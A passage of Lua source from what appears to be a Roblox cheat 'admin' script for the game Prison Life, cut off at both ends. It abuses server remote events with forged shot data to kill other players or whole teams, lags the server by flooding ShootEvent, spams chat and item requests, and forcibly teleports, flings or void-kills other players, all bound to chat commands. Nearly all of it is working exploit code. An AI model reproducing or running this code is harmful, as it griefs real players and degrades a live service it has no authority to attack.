        task.wait(0.03)
    end;
end;

LocalPlayer.CharacterAdded:Connect(function(Char)
    if (Info.AutoRespawnOldTeam == "Medium stone grey" or LocalPlayer.TeamColor.Name == "Medium stone grey") and not Info.RespawnPaused and not States.Forcefield then
        Info.RespawnPaused = true
        coroutine.wrap(FixScreen)()
        pcall(function()
            if not Info.HasDied then
                Loadchar("Really black");
            end;
            TeamEvent("Medium stone grey")
        end);
        if not Info.HasDied and not Info.LoadingNeutralChar then
            LoadPos();
        end;
        coroutine.wrap(FixScreen)()
        Info.RespawnPaused = false;
    end;
end);

LocalPlayer.CharacterRemoving:Connect(function()
    if not Info.HasDied then
        Info.AutoRespawnOldTeam = LocalPlayer.TeamColor.Name
    end;
end);

function GetTool()
    return LocalPlayer.Character:FindFirstChildOfClass('Tool') or nil
end

function AutoRespawnCharacterAdded(CHAR)
    local function OnDied()
        if States.AutoRespawn and not States.GivingKeycard and not States.Forcefield then
            Info.HasDied = true;
            SavePos();
            Info.AutoRespawnOldTeam = LocalPlayer.TeamColor.Name
            if Info.AutoRespawnOldTeam ~= "Medium stone grey" and LocalPlayer.TeamColor.Name ~= "Medium stone grey" then
                Loadchar();
            else
                Loadchar("Really black");
            end;
            LoadPos();
            Info.HasDied = false;
        end;
    end;
    local Humanoid = CHAR:WaitForChild("Humanoid", 1);
    if Humanoid then
        Humanoid.Died:Connect(OnDied);
    end;
end;

function LocalViewerAdded()
    pcall(function()
        Camera.CameraSubject = CurrentlyViewing.Player.Character;
    end);
end;

function Teleport(Player, Position)
    PauseChecks = true;
    if Player == LocalPlayer then
        if LocalPlayer.Character then
            LocalPlayer.Character:SetPrimaryPartCFrame(Position);
        end;
    else
        pcall(function()
            SavePos();
            Loadchar();
            LocalPlayer.Character:SetPrimaryPartCFrame(Position);
            task.spawn(function()
                rService.RenderStepped:wait();
                Camera.CFrame = SavedCameraPosition;
            end)
            ItemHandler(workspace.Prison_ITEMS.single.Hammer.ITEMPICKUP);
            if LocalPlayer.Backpack:FindFirstChild("Hammer") then
                ItemHandler(workspace.Prison_ITEMS.giver.M9.ITEMPICKUP);
            end
            local CHAR = LocalPlayer.Character;
            CHAR.Humanoid.Name = "1";
            local c = CHAR["1"]:Clone();
            c.Name = "Humanoid";
            c.Parent = CHAR;
            CHAR["1"]:Destroy();
            Workspace.CurrentCamera.CameraSubject = CHAR;
            CHAR.Animate.Disabled = true;
            CHAR.Animate.Disabled = false;
            CHAR.Humanoid.DisplayDistanceType = "None";
            local tool = LocalPlayer.Backpack:FindFirstChild("Hammer") or LocalPlayer.Backpack:FindFirstChild("M9");
            WhitelistItem(tool);
            tool.Parent = CHAR;
            local STOP = 0;
            repeat
                STOP = STOP + 7;
                LocalPlayer.Character:SetPrimaryPartCFrame(Position);
                Player.Character:SetPrimaryPartCFrame(LocalPlayer.Character.Head.CFrame * CFrame.new(0, 0, -0.75));
                task.wait(0.03);
            until (not LocalPlayer.Character:FindFirstChild(tool.Name) or not LocalPlayer.Character or not Player.Character or STOP > 700) and STOP > 3;
            Loadchar();
            LoadPos();
        end);
    end;
end;

function LoopTeleport(Player, Position, All)
    PauseChecks = true;
    States.Loopbring = true
    task.spawn(function()
        while task.wait() do
            pcall(function()
                SavePos();
                LocalPlayer.Character:SetPrimaryPartCFrame(Position);
                local CHAR = LocalPlayer.Character;
                CHAR.Humanoid.Name = "1";
                local c = CHAR["1"]:Clone();
                c.Name = "Humanoid";
                c.Parent = CHAR;
                CHAR["1"]:Destroy();
                Workspace.CurrentCamera.CameraSubject = CHAR;
                CHAR.Animate.Disabled = true;
                CHAR.Animate.Disabled = false;
                CHAR.Humanoid.DisplayDistanceType = "None";
                CHAR.Humanoid.PlatformStand = true
                local tool;
                local STOP = 0;
                local Finish = false;
                task.spawn(function()
                    LocalPlayer.CharacterAdded:wait();
                    Finish = true;
                end);
                repeat
                    STOP = STOP + 3;
                    task.wait(0.03);
                until (not CHAR or Finish or not States.Loopbring);
                LocalPlayer.Character.HumanoidRootPart.Anchored = false;
                --Loadchar();
                if not States.Loopbring then
                    Loadchar() 
                end;
                LoadPos();
            end);
            if not States.Loopbring or not Player or not Players:FindFirstChild(Player.Name) then
                break
            end;
        end;
    end);

    while task.wait() do
        for _,p in pairs(Players:GetPlayers()) do
            if p ~= LocalPlayer then
                if (not All and p == Player) or All == true then
                    ItemHandler(workspace.Prison_ITEMS.single.Hammer.ITEMPICKUP);
                    pcall(function()
                        if p.Character and p.Character.Humanoid and p.Character.Humanoid.Health > 0 and p.Character.Torso.Anchored == false then
                            for i,v in pairs(LocalPlayer.Backpack:GetChildren()) do
                                LocalPlayer.Character.Humanoid:EquipTool(v);
                                local Limit = 0
                                repeat
                                    LocalPlayer.Character:SetPrimaryPartCFrame(Position);
                                    p.Character:SetPrimaryPartCFrame(LocalPlayer.Character.Head.CFrame * CFrame.new(0, 0, -0.75));
                                    if not States.Loopbring or not Player or not Players:FindFirstChild(Player.Name) then
                                        break
                                    end;
                                    task.wait(0.03)
                                until v.Parent ~= LocalPlayer.Character or Limit > 500 or not p.Character or not p.Character.Humanoid or p.Character.Humanoid.Health <= 0 or p.Character.Torso.Anchored == true
                                v:Destroy();
                            end;
                        end;
                    end);
                end;
            end;
        end;
        if not States.Loopbring or not Player or not Players:FindFirstChild(Player.Name) then
            break
        end;
    end;
    States.Loopbring = false;
end;

function TeleportPlayers(Player1, Player2)
    if Player1 == LocalPlayer then
        pcall(function()
            LocalPlayer.Character:SetPrimaryPartCFrame(Player2.Character.Head.CFrame);
        end);
    elseif Player2 == LocalPlayer then
        pcall(function()
            Teleport(Player1, LocalPlayer.Character.Head.CFrame);
        end);
    else
        pcall(function()
            SavePos();
            Loadchar();
            ItemHandler(workspace.Prison_ITEMS.single.Hammer.ITEMPICKUP);
            if LocalPlayer.Backpack:FindFirstChild("Hammer") then
                ItemHandler(workspace.Prison_ITEMS.giver.M9.ITEMPICKUP);
            end
            local CHAR = LocalPlayer.Character;
            CHAR.Humanoid.Name = "1";
            local c = CHAR["1"]:Clone();
            c.Name = "Humanoid";
            c.Parent = CHAR;
            CHAR["1"]:Destroy();
            Workspace.CurrentCamera.CameraSubject = CHAR;
            CHAR.Animate.Disabled = true;
            CHAR.Animate.Disabled = false;
            CHAR.Humanoid.DisplayDistanceType = "None";
            local tool = LocalPlayer.Backpack:FindFirstChild("Hammer") or LocalPlayer.Backpack:FindFirstChild("M9");
            tool.Parent = CHAR;
            local STOP = 0;
            repeat
                STOP = STOP + 7;
                LocalPlayer.Character:SetPrimaryPartCFrame(Player2.Character.Head.CFrame * CFrame.new(0, 0, -4));
                Player1.Character:SetPrimaryPartCFrame(LocalPlayer.Character.Head.CFrame * CFrame.new(0, 0, -0.75));
                task.wait(0.03);
            until (not LocalPlayer.Character:FindFirstChild("M9") and not LocalPlayer.Character:FindFirstChild("Hammer") or not LocalPlayer.Character.HumanoidRootPart or not LocalPlayer.Character or not Player1.Character or not Player2.Character or STOP > 700) and STOP > 3;
            LocalPlayer.Character.HumanoidRootPart.Anchored = false;
            Loadchar();
            LoadPos();
        end);
    end;
end;

function BodyFling(Player)
    pcall(function()
        States.BodyFling = true;
        SavePos();
        task.wait(1/2)
        local BT = Instance.new("BodyThrust");
        BT.Name = "Flinger";
        BT.Parent = LocalPlayer.Character.HumanoidRootPart;
        BT.Force = Vector3.new(10500, 0, 10500);
        BT.Location = Player.Character.HumanoidRootPart.Position;
        local BP = Instance.new("BodyPosition");
        BP.Name = "BP"
        BP.Parent = LocalPlayer.Character.HumanoidRootPart;
        BP.D = 0;
        BP.MaxForce = Vector3.new(math.huge, math.huge, math.huge);
        BP.P = 9e4
        while true do
            pcall(function()
                if Player.Character then
                    LocalPlayer.Character.Humanoid.Sit = false;
                    BP.Position = Player.Character.HumanoidRootPart.Position;
                    Camera.CameraSubject = Player.Character;
                end;
            end);
            pcall(function()
                if not LocalPlayer.Character.HumanoidRootPart:FindFirstChild("BP") then
                    BP = Instance.new("BodyPosition");
                    BP.Name = "BP"
                    BP.Parent = LocalPlayer.Character.HumanoidRootPart;
                    BP.D = 0;
                    BP.MaxForce = Vector3.new(math.huge, math.huge, math.huge);
                    BP.P = 9e4
                end;
            end);
            pcall(function()
                if not LocalPlayer.Character.HumanoidRootPart:FindFirstChild("Flinger") then
                    BT = Instance.new("BodyThrust");
                    BT.Name = "Flinger";
                    BT.Parent = LocalPlayer.Character.HumanoidRootPart;
                    BT.Force = Vector3.new(10500, 0, 10500);
                    BT.Location = Player.Character.HumanoidRootPart.Position;
                end;
            end);
            pcall(function()
                for _, child in pairs(LocalPlayer.Character:GetDescendants()) do
                    if child:IsA("BasePart") then
                        child.CustomPhysicalProperties = PhysicalProperties.new(2, 0.3, 0.5)
                    end
                end
            end);
            if not States.BodyFling or not Player or not Players:FindFirstChild(Player.Name) then
                break
            end;
            rService.RenderStepped:wait();
        end;
        BT:Destroy();
        BP:Destroy();
        Loadchar();
        LoadPos();
        task.wait(1/2)
        Camera.CameraSubject = CurrentlyViewing.Player.Character or LocalPlayer.Character.Humanoid
        States.BodyFling = false
    end);
end;


function GetPlayer(STRING, PLAYER)
    if STRING then
        if STRING:lower() == "me" then
            return PLAYER;
        end;
    else
        return PLAYER;
    end;
    local Player;
    for i,v in pairs(Players:GetPlayers()) do
        pcall(function()
            local LowerName = v.Name:lower();
            local LowerDisplayName = v.DisplayName:lower();
            if LowerName:sub(1, #STRING) == STRING:lower() or LowerDisplayName:sub(1, #STRING) == STRING:lower() then
                Player = v;
            end;
        end);
    end;
    return Player;
end;

function KillPlayers(TEAM, Whitelist)
    local Events = {};

    for _, PLR in pairs(TEAM:GetPlayers()) do
        if PLR ~= LocalPlayer and PLR ~= Whitelist and CheckProtected(PLR, "killcmds") then
            if PLR.Character then
                if PLR.TeamColor == LocalPlayer.TeamColor and not States.AntiCriminal and States.AutoTeamChange then
                    SavePos();
                    Loadchar(BrickColor.random().Name);
                    LoadPos();
                end;
                pcall(function()
                    for i = 1, 15 do
                        Events[#Events + 1] = {
                            Hit = PLR.Character:FindFirstChildOfClass("Part");
                            Cframe = CFrame.new();
                            RayObject = Ray.new(Vector3.new(), Vector3.new());
                            Distance = 0;
                        };
                    end;
                end);
            end;
        end;
    end;

    ItemHandler(workspace.Prison_ITEMS.giver["Remington 870"].ITEMPICKUP);

    pcall(function()
        local Gun = LocalPlayer.Backpack:FindFirstChild("Remington 870") or LocalPlayer.Character:FindFirstChild("Remington 870")
        if not Gun then
            ItemHandler(workspace.Prison_ITEMS.giver["AK-47"].ITEMPICKUP);
            Gun = LocalPlayer.Backpack:FindFirstChild("AK-47") or LocalPlayer.Character:FindFirstChild("AK-47")
        end;
        WhitelistItem(Gun);
        task.spawn(function()
            for i = 1, 30 do
                rStorage.ReloadEvent:FireServer(Gun);
                task.wait(1/2);
            end;
        end);
        rStorage.ShootEvent:FireServer(Events, Gun)
    end);
end;

function Annoy(PLR)
    States.Annoy = true;
    local Connection;
    pcall(function()
        local SavedWalkSpeed = 24;
        Teleport(LocalPlayer, PLR.Character.Head.CFrame * CFrame.new(0, 0, 1));
        Connection = PLR.CharacterAdded:Connect(function(CHAR)
            local Head = CHAR:WaitForChild("Head", 1);
            if Head then
                Teleport(LocalPlayer, Head.CFrame * CFrame.new(0, 0, 1));
            end;
        end);
        task.spawn(function()
            while true do
                pcall(function()
                    if LocalPlayer.Character and PLR.Character then
                        local LPart = LocalPlayer.Character:FindFirstChildWhichIsA("BasePart");
                        local VPart = PLR.Character:FindFirstChildWhichIsA("BasePart");
                        if (LPart.Position-VPart.Position).Magnitude <= 15 then
                            if PunchFunction and PLR.Character.Humanoid.Health > 0 then
                                coroutine.wrap(PunchFunction)();
                            end;
                        end;
                    end;
                end);
                if not States.Annoy or not PLR then
                    break
                end;
                task.wait(0.6);
            end;
        end);
        while task.wait(0.03) do
            pcall(function()
                if PLR.Character then
                    if PLR.Character.Humanoid.Health > 0 then
                        LocalPlayer.Character.Humanoid:MoveTo(PLR.Character.PrimaryPart.Position);
                        LocalPlayer.Character.Humanoid.WalkSpeed = SavedWalkSpeed + 2;
                        LocalPlayer.Character.Humanoid.Sit = false;
                        LocalPlayer.Character.Torso.Anchored = false;
                    end;
                end;
            end);
            if not States.Annoy or not PLR then
                break
            end;
        end;
    end);
    if Connection then
        Connection:Disconnect();
        Connection = nil;
    end;
    States.Annoy = false;
end;

function Fling(Player, isSuperFling)
    pcall(function()
        if Player == LocalPlayer then
            BodyVelocity.MaxForce = Vector3.new(9e9, 9e9, 9e9);
            if isSuperFling == false then
                BodyVelocity.Velocity = Vector3.new(500, 500, 500);
            elseif isSuperFling == true then
                BodyVelocity.Velocity = Vector3.new(999, 999, 999);
            end;
            task.wait(1/10)
            BodyVelocity:Destroy();
        else
            SavePos();
            Loadchar();
            ItemHandler(workspace.Prison_ITEMS.single.Hammer.ITEMPICKUP);
            if LocalPlayer.Backpack:FindFirstChild("Hammer") then
                ItemHandler(workspace.Prison_ITEMS.giver.M9.ITEMPICKUP);
            end
            local CHAR = LocalPlayer.Character;
            CHAR.Humanoid.Name = "1";
            local c = CHAR["1"]:Clone();
            c.Name = "Humanoid";
            c.Parent = CHAR;
            CHAR["1"]:Destroy();
            Workspace.CurrentCamera.CameraSubject = CHAR;
            CHAR.Animate.Disabled = true;
            task.wait(0.03);
            CHAR.Animate.Disabled = false;
            CHAR.Humanoid.DisplayDistanceType = "None";
            local tool = LocalPlayer.Backpack:FindFirstChild("Hammer") or LocalPlayer.Backpack:FindFirstChild("M9");
            tool.Parent = CHAR;
            local STOP = 0;
            repeat
                STOP = STOP + 1;
                LocalPlayer.Character:SetPrimaryPartCFrame(Player.Character.Head.CFrame * CFrame.new(0, 0, 0.75));
                task.wait(0.03);
            until (not LocalPlayer.Character:FindFirstChild("M9") and not LocalPlayer.Character:FindFirstChild("Hammer") or not LocalPlayer.Character.HumanoidRootPart or not Player.Character.HumanoidRootPart or not LocalPlayer.Character or not Player.Character or STOP > 500) and STOP > 3;
            LocalPlayer.Character.HumanoidRootPart.Anchored = false;

            local BodyVelocity = Instance.new("BodyVelocity", Player.Character.HumanoidRootPart)

            BodyVelocity.MaxForce = Vector3.new(9999999, 9999999, 9999999);
            if isSuperFling == false then
                BodyVelocity.Velocity = Vector3.new(500, 500, 500);
            elseif isSuperFling == true then
                BodyVelocity.Velocity = Vector3.new(999, 999, 999);
            end;
            task.wait(1/10)
            BodyVelocity:Destroy();
            task.wait(1/5);
            Loadchar();
            LoadPos();
        end;
    end);
end;

function LagServer(Strength)
    States.LagServer = true;
    local Events = {}
    for i = 1, 100 do
        Events[#Events+1] = {
            Hit = workspace:FindFirstChildOfClass("Part");
            Cframe = CFrame.new();
            Distance = math.huge;
            RayObject = Ray.new(Vector3.new(), Vector3.new());
        };
    end;
    while task.wait(0.03) do
        if not States.LagServer then
            break
        end;
        task.wait(1/10);
        ItemHandler(workspace.Prison_ITEMS.giver["Remington 870"].ITEMPICKUP);
        pcall(function()
            local Gun = LocalPlayer.Backpack:FindFirstChild("Remington 870");
            for i = 1, Strength do
                rStorage.ShootEvent:FireServer(Events, Gun);
            end;
        end);
        task.wait(1);
    end;
    States.LagServer = false;
end;

function SaveWayPoint(POS, Name)
    if not POS or not Name then
        return
    end;
    SavedWaypoints[Name] = {X = POS.X, Y = POS.Y, Z = POS.Z};
    pcall(function()
        local Encoded = HttpService:JSONEncode(SavedWaypoints);
        writefile("WrathAdminSavedWayPoints.json", Encoded);
    end);
end;

function ToBoolean(STRING)
    return STRING:lower() == "true"
end;

function LogSpam(Message)
    local ChatMain = require(LocalPlayer.PlayerScripts.ChatScript.ChatMain);

    States.LogSpam = true;

    local function GenerateString(Length)
        local Possible = "QWERTYUIOPASDFGKLZXCVBNMqwertyuiopasdfghjklzxcvbnm1234567890";
        local Characters = {};
        local Output = "";
        Possible:gsub(".", function(v)
            table.insert(Characters, v);
        end);
        for i = 1, Length do
            local RandomChar = math.random(1, #Characters);
            Output = Output .. Characters[RandomChar];
        end;
        return Output;
    end;
    
    while task.wait(0.03) do
        if Message then
            ChatMain.MessagePosted:fire(Message);
        else
            local Random = GenerateString(math.random(10, 20));
            ChatMain.MessagePosted:fire(Random);
        end;
        if not States.LogSpam then
            break
        end;
    end;
end;

function MeleeKill(PLR)
    if LocalPlayer.Character and PLR.Character then
        local MyHead = LocalPlayer.Character:FindFirstChild("Head");
        local TheirHead = PLR.Character:FindFirstChild("Head");
        if MyHead and TheirHead then
            LocalPlayer.Character:SetPrimaryPartCFrame(TheirHead.CFrame * CFrame.new(0, 0, 1));
            pcall(function()
                LocalPlayer.Character.Humanoid.Sit = false;
            end);
        end;
    end
    task.wait(0.15);
    for i = 1, 30 do
        MeleeEvent(PLR);
    end;
end;

function FPSBoost()
    game.Lighting.Brightness = 30
    for i,v in pairs(workspace:GetDescendants()) do
        if v:IsA("BasePart") then
            if v.Anchored ~= true and not Players:GetPlayerFromCharacter(v.Parent) then
                v:Destroy()
            else
                v.Material = Enum.Material.Plastic;
            end;
            v:GetPropertyChangedSignal("Anchored"):Connect(function()
                if v.Anchored ~= true then
                    v:Destroy();
                end;
            end);
        end;
        if v:IsA("Decal") then
            v:Destroy();
        end;
    end;
    workspace.DescendantAdded:Connect(function(PART)
        if PART:IsA("BasePart") and not Players:GetPlayerFromCharacter(PART.Parent) then
            if PART.Anchored ~= true then
                PART:Destroy()
            else
                PART.Material = Enum.Material.Plastic;
            end;
            PART:GetPropertyChangedSignal("Anchored"):Connect(function()
                if PART.Anchored ~= true then
                    PART:Destroy();
                end;
            end);
        end;
        if PART:IsA("Decal") then
            PART:Destroy();
        end;
    end);
end;

function GetClosestPlayerToPosition(Position)
    local Max, Closest = math.huge;
    for i,v in pairs(Players:GetPlayers()) do
        if v.Character then
            local Tool = v.Character:FindFirstChildOfClass("Tool") or v.Backpack:FindFirstChildOfClass("Tool");
            if Tool then
                local ShootPart = Tool:FindFirstChild("Muzzle");
                local PrimaryPart = v.Character.PrimaryPart;
                if PrimaryPart and ShootPart then
                    local Distance = (ShootPart.Position-Position).Magnitude;
                    if Distance < Max then
                        Max = Distance;
                        Closest = v;
                    end;    
                end;
            end;
        end;
    end;

    return Closest;
end;

function ClosestCharacter(MaxDistance)
    local Max, Closest = MaxDistance or math.huge;
    for i,v in pairs(Players:GetPlayers()) do
        if v ~= LocalPlayer and v.Character then
            local Head = game.FindFirstChild(v.Character, "Head");
            if Head then
                local Pos = Head.Position
                if LocalPlayer.Character.PrimaryPart then
                    local Distance = (Pos - LocalPlayer.Character.PrimaryPart.Position).Magnitude;
                    if Distance < Max then
                        Max = Distance;
                        Closest = v.Character;
                    end;
                end;
            end;
        end;
    end;
    return Closest;
end;

function SpeedKill(Tables)
    local Events = {};

    for i,v in next, Tables do
        if v.Character then
            if v.TeamColor == LocalPlayer.TeamColor and not States.AntiCriminal and States.AutoTeamChange then
                SavePos();
                Loadchar(BrickColor.random().Name);
                LoadPos();
            end;
            for i = 1, 10 do
                Events[#Events + 1] = {
                    Hit = v.Character:FindFirstChildOfClass("Part");
                    Cframe = CFrame.new();
                    RayObject = Ray.new(Vector3.new(), Vector3.new());
                    Distance = 0;
                };
            end;
        end;
    end;

    ItemHandler(workspace.Prison_ITEMS.giver["Remington 870"].ITEMPICKUP);

    pcall(function()
            
        local Gun = LocalPlayer.Backpack:FindFirstChild("Remington 870") or LocalPlayer.Character:FindFirstChild("Remington 870")
        Gun.GunInterface:Destroy();
        Gun.Parent = LocalPlayer.Character;
        WhitelistItem(Gun);

        rStorage.ShootEvent:FireServer(Events, Gun)

        LocalPlayer.Character["Remington 870"]:Destroy();
    end);
end;

function VoidKill(Player)
    pcall(function()
        local CHAR = LocalPlayer.Character;
        CHAR.Humanoid.Name = "1";
        local c = CHAR["1"]:Clone();
        c.Name = "Humanoid";
        c.Parent = CHAR;
        CHAR["1"]:Destroy();
        Workspace.CurrentCamera.CameraSubject = CHAR;
        CHAR.Animate.Disabled = true;
        task.wait(0.03);
        CHAR.Animate.Disabled = false;
        CHAR.Humanoid.DisplayDistanceType = "None";
        ItemHandler(workspace.Prison_ITEMS.single["Hammer"].ITEMPICKUP);
        if not LocalPlayer.Backpack:FindFirstChild("Hammer") then
            ItemHandler(workspace.Prison_ITEMS.giver.M9.ITEMPICKUP)
        end
        local tool = LocalPlayer.Backpack:FindFirstChild("Hammer") or LocalPlayer.Backpack:FindFirstChild("M9")
        tool.Handle.Massless = true
        tool.GripPos = Vector3.new(0, 0, -9999)
        tool.Parent = CHAR;
        task.wait(0.03);
        tool.Grip = CFrame.new(Vector3.new(0, 0, 0))
        local STOP = 0;
        LoadPos()
        repeat
            STOP = STOP + 1;
            LocalPlayer.Character:SetPrimaryPartCFrame(Player.Character.Head.CFrame * CFrame.new(0, 0, 0.75));
            task.wait(0.03);
        until (not LocalPlayer.Character:FindFirstChild(tool.Name) or not LocalPlayer.Character.HumanoidRootPart or not Player.Character.HumanoidRootPart or not LocalPlayer.Character or not Player.Character or STOP > 500) and STOP > 3;
        task.wait(1/5)
        Loadchar();
        LoadPos();
    end)
end;

function CheckKeycode(Key)
    local Result;
    pcall(function()
        Result = Enum.KeyCode[Key];
    end)
    return Result
end;

function ArmorSpam(Num)
    States.ArmorSpam = true
    while task.wait() do
        for i = 1, Num do
            pcall(coroutine.wrap(function()
                workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.clothes["Riot Police"].ITEMPICKUP)
            end))
        end
        if not States.ArmorSpam then
            break
        end;
    end;
    States.ArmorSpam = false;
end;

function UseCommand(MESSAGE)
    local Args = MESSAGE:split(" ");

    if not Args[1] then 
        return
    end;

    if Args[1] == "/e" then
        table.remove(Args, 1);
    end;

    if Args[1] == "/w" then
        table.remove(Args, 1)
        if Args[2] then
            table.remove(Args, 1);
        end; 
    end;

    if Args[1]:sub(1, 1) ~= Settings.Prefix then
        return
    end;

    local CommandName = Args[1]:sub(2);
    
    local function CMD(NAME)
        return NAME == CommandName:lower();
    end;

    --// Commands
    if CMD("cmds") then
        ToggleCmds();
        Notify("Success", "Toggled commands.", 2);
    end;
    if CMD("output") or CMD("logs") then
        ToggleOutput();
        Notify("Success", "Toggled output / logs.", 2);
    end;
    if CMD("bring") then
        local Player = GetPlayer(Args[2], LocalPlayer)
        if Player then
            if LocalPlayer.Character then
                if LocalPlayer.Character.PrimaryPart then
                    Teleport(Player, LocalPlayer.Character.PrimaryPart.CFrame);
                    Notify("Success", "Brought " .. Player.Name .. ".");
                end;
            end;
        else
            Notify("Error", Args[2] .. " is not a valid player.", 2);
        end;
    end;
    if CMD("goto") or CMD("to") then
        local Player = GetPlayer(Args[2], LocalPlayer)
        if Player then
            if Player.Character then
                if Player.Character.PrimaryPart then
                    Teleport(LocalPlayer, Player.Character.PrimaryPart.CFrame);
                    Notify("Success", "Teleported to " .. Player.Name .. ".", 2);
                end;
            end;
        else
            Notify("Error", Args[2] .. " is not a valid player.", 2);
        end;
    end;
    if CMD("nexus") or CMD("nex") then
        local Player = GetPlayer(Args[2], LocalPlayer)
        if Player then
            Teleport(Player, CFrame.new(888, 100, 2388));
            Notify("Success", "Teleported " .. Player.Name .. " to Nexus.", 2);
        else
            Notify("Error", Args[2] .. " is not a valid player.", 2);
        end;
    end;
    if CMD("rj") or CMD("rejoin") then
        Notify("Success", "Rejoining...", 2);
        getgenv().Rejoining = true
        TeleportService:TeleportToPlaceInstance(game.PlaceId, game.JobId, LocalPlayer);
    end;
    if CMD("auto") then
        States.AutoRespawn = not States.AutoRespawn;
        if LocalPlayer.Character then
            AutoRespawnCharacterAdded(LocalPlayer.Character);
        end;
        pcall(function()
            if LocalPlayer.Character.Humanoid.Health <= 0 then
                SavePos();
                Loadchar()
                LoadPos();
            end;
        end);
        ChangeGuiToggle(States.AutoRespawn, "Auto-Respawn");
        Notify("Success", "Togged auto respawn to " .. tostring(States.AutoRespawn) .. ".");
    end;
    if CMD("atc") or CMD("autoteamchange") then
        States.AutoTeamChange = not States.AutoTeamChange;
        ChangeGuiToggle(States.AutoTeamChange, "Auto Team Change");
        Notify("Success", "Togged auto team change to " .. tostring(States.AutoTeamChange) .. ".");
    end;
    if CMD("kill") or CMD("k") then
        Args[2] = Args[2]:lower()
        local First, Rest = Args[2]:sub(1, 1):upper(), Args[2]:sub(2);
        local Team = First .. Rest;

         if Args[2] == "all" or Args[2] == "a" then
            KillPlayers(Players);
            Notify("Success", "Now killed all.", 2);
        elseif Args[2] == "guards" or Args[2] == "g" then
            KillPlayers(Teams.Guards)
            Notify("Success", "Now killed guards.", 2);
        elseif Args[2] == "inmates" or Args[2] == "i" then
           KillPlayers(Teams.Inmates)
           Notify("Success", "Now killed inmates.", 2);
        elseif Args[2] == "criminals" or Args[2] == "c" then
            KillPlayers(Teams.Criminals)
            Notify("Success", "Now killed Criminals.", 2);
        else
            local Player = GetPlayer(Args[2], LocalPlayer);
            if Player then
                Kill({Player});
                Notify("Success", "Killed " .. Player.Name .. ".");
            else
                Notify("Error", Args[2] .. " is not a valid player.", 2);
            end;
        end;
    end;
    if CMD("lk") then
        if Args[2] == "all" then
            States.KillAll = true;
            Notify("Success", "Now loop-killing everyone.", 2);
        elseif Args[2] == "guards" or Args[2] == "g" then
            States.KillGuards = true;
            Notify("Success", "Now loop-killing Guards.", 2);
        elseif Args[2] == "inmates" or Args[2] == "i" then
            States.KillInmates = true;
            Notify("Success", "Now loop-killing Inmates.", 2);
        elseif Args[2] == "criminals" or Args[2] == "c" then
            States.KillCriminals = true;
            Notify("Success", "Now loop-killing Criminals.", 2);
        else
            local Player = GetPlayer(Args[2], LocalPlayer);
            if Player then
                Loopkilling[Player.UserId] = Player;
                Notify("Success", "Loop-killing " .. Player.Name .. ".");
            else
                Notify("Error", Args[2] .. " is not a valid player.", 2);
            end;
        end;
    end;
    if CMD("unlk") then
        if Args[2] == "all" then
            States.KillAll = false;
            States.KillGuards = false;
            States.KillInmates = false;
            States.KillCriminals = false;
            Loopkilling = {};
            Notify("Success", "Unloop-killed everyone.", 2);
        elseif Args[2] == "guard" or Args[2] == "g" then
            States.KillGuards = false;
            for i,v in pairs(Teams.Guards:GetPlayers()) do
                Loopkilling[v.UserId] = nil;
            end;
            Notify("Success", "Unloop-killed Guards.", 2);
        elseif Args[2] == "i" or Args[2] == "inmate" then
            States.KillInmates = false;
            for i,v in pairs(Teams.Inmates:GetPlayers()) do
                Loopkilling[v.UserId] = nil;
            end;
            Notify("Success", "Unloop-killed Inmates.", 2);
        elseif Args[2] == "c" or Args[2] == "crims" then
            States.KillCriminals = false;
            for i,v in pairs(Teams.Criminals:GetPlayers()) do
                Loopkilling[v.UserId] = nil;
            end;
            Notify("Success", "Unloop-killed Criminals.", 2);
        else
            local Player = GetPlayer(Args[2], LocalPlayer);
            if Player then
                Loopkilling[Player.UserId] = nil;
                Notify("Success", "Unloop-killed " .. Player.Name .. ".", 2);
            else
                Notify("Error", Args[2] .. " is not a valid player.", 2);
            end;
        end;
    end;
    if CMD("clk") or CMD("clearloopkills") then
        States.KillAll = false;
        States.KillGuards = false;
        States.KillInmates = false;
        States.KillCriminals = false;
        States.MeleeAll = false;
        States.SpeedKillAll = false;
        States.SpeedKillGuards = false;
        States.SpeedKillInmates = false;
        States.SpeedKillCriminals = false;
        MeleeKilling = {};
        Loopkilling = {};
        SpeedKilling = {};
        Notify("Success", "Cleared all loop-kills.", 2);
    end
    if CMD("view") then
        pcall(function()
            CurrentlyViewing.Connection:Disconnect();
        end)
        CurrentlyViewing = {Player = GetPlayer(Args[2], LocalPlayer), Connection = nil};
        if CurrentlyViewing.Player then
            local function ViewerAdded(CHAR)
                Camera.CameraSubject = CHAR;
            end;
            if CurrentlyViewing.Player.Character then
                ViewerAdded(CurrentlyViewing.Player.Character);
            end;
            CurrentlyViewing.Connection = CurrentlyViewing.Player.CharacterAdded:Connect(ViewerAdded);
            Notify("Success", "Now viewing: " .. CurrentlyViewing.Player.Name .. ".", 2);
        else
            Notify("Error", Args[2] .. " is not a valid player.", 2);
        end;
    end;
    if CMD("unview") then
        pcall(function()
            CurrentlyViewing.Connection:Disconnect();
            CurrentlyViewing = nil;
        end);
        if LocalPlayer.Character then
            if LocalPlayer.Character:FindFirstChild("Humanoid") then
                Camera.CameraSubject = LocalPlayer.Character.Humanoid;
            end;
        end;
        Notify("Success", "Stopped viewing.", 2)
    end;
    if CMD("gun") or CMD("guns") or CMD("allguns") then
        GiveGuns();
        Notify("Success", "Obtained all guns.", 2);
    end
    if CMD("team") or CMD("t") then
        -- :team 255 255 255 = white
        SavePos();
        if not Args[4] then
            if Args[2] == "inmates" or Args[2] == "i" then
                TeamEvent("Bright orange");
                Notify("Success", "Changed team to Inmates.", 2);
            elseif Args[2] == "guards" or Args[2] == "g" then
                Loadchar("Bright blue");
                Notify("Success", "Changed team to Guards.", 2);
            elseif Args[2] == "criminals" or Args[2] == "c" then
                Loadchar("Really red");
                Notify("Success", "Changed team to Criminals.", 2);
            elseif Args[2] == "neutral" or Args[2] == "n" then
                TeamEvent("Medium stone grey");
                Notify("Success", "Changed team to Neutral.", 2);
            elseif Args[2] == "random" or Args[2] == "r" then
                local RandomColor = BrickColor.random().Name
                Loadchar(RandomColor);
                Notify("Success", "Changed team to random team.", 2);
            elseif CustomColors[Args[2]] then
                local R, G, B = CustomColors[Args[2]][1], CustomColors[Args[2]][2], CustomColors[Args[2]][3]
                Loadchar(Color3.fromRGB(R, G, B))
                Notify("Success", "Changed team to " .. Args[2] .. ".", 2);
            end;
        else
            local R, G, B = tonumber(Args[2]), tonumber(Args[3]), tonumber(Args[4]);
            if R and G and B then
                Loadchar(Color3.fromRGB(R, G, B));
